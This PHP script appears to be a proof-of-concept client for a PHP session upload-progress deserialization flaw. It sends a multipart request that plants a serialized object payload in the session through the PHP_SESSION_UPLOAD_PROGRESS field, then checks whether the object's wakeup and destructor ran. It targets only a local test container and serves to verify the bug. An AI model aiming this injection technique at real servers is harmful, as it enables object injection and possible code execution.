<?php
/**
 * Loopback-only client. Talks to 127.0.0.1 inside the prove-http container.
 */
$host = '127.0.0.1';
$port = 8080;
$sid = 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa';
$payload = '|O:4:"Demo":1:{s:3:"cmd";s:3:"pwn";}';
$boundary = '----cve115560boundary';

$body = "--{$boundary}\r\n"
    . "Content-Disposition: form-data; name=\"PHP_SESSION_UPLOAD_PROGRESS\"\r\n\r\n"
    . $payload . "\r\n"
    . "--{$boundary}\r\n"
    . "Content-Disposition: form-data; name=\"PHPSESSID\"\r\n\r\n"
    . $sid . "\r\n"
    . "--{$boundary}\r\n"
    . "Content-Disposition: form-data; name=\"f\"; filename=\"a.txt\"\r\n"
    . "Content-Type: application/octet-stream\r\n\r\n"
    . "hello\r\n"
    . "--{$boundary}--\r\n";

$req = "POST /index.php HTTP/1.1\r\n"
    . "Host: {$host}:{$port}\r\n"
    . "Cookie: PHPSESSID={$sid}\r\n"
    . "Content-Type: multipart/form-data; boundary={$boundary}\r\n"
    . "Content-Length: " . strlen($body) . "\r\n"
    . "Connection: close\r\n"
    . "\r\n"
    . $body;

$fp = null;
$errno = 0;
$errstr = '';
for ($i = 0; $i < 25; $i++) {
    $fp = @fsockopen($host, $port, $errno, $errstr, 1);
    if ($fp) {
        break;
    }
    usleep(200000);
}
if (!$fp) {
    fwrite(STDERR, "connect failed: $errno $errstr\n");
    exit(1);
}
stream_set_timeout($fp, 5);
fwrite($fp, $req);
$resp = stream_get_contents($fp);
fclose($fp);
echo $resp;
echo "\nCLIENT_SAW_WAKEUP:" . (strpos($resp, "WAKEUP:pwn") !== false ? "yes" : "no") . "\n";
echo "CLIENT_SAW_DTOR:" . (strpos($resp, "DTOR:pwn") !== false ? "yes" : "no") . "\n";
exit(strpos($resp, "WAKEUP:pwn") !== false ? 0 : 1);
